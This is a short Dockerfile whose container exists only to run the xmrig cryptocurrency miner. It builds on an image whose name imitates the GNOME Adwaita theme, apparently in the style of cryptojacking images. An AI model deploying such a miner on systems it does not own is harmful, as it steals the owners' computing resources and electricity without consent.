FROM adwaitasa/adwaita
RUN apt-get update
ENTRYPOINT /xmrig-5.1.0/xmrig --config=config.json
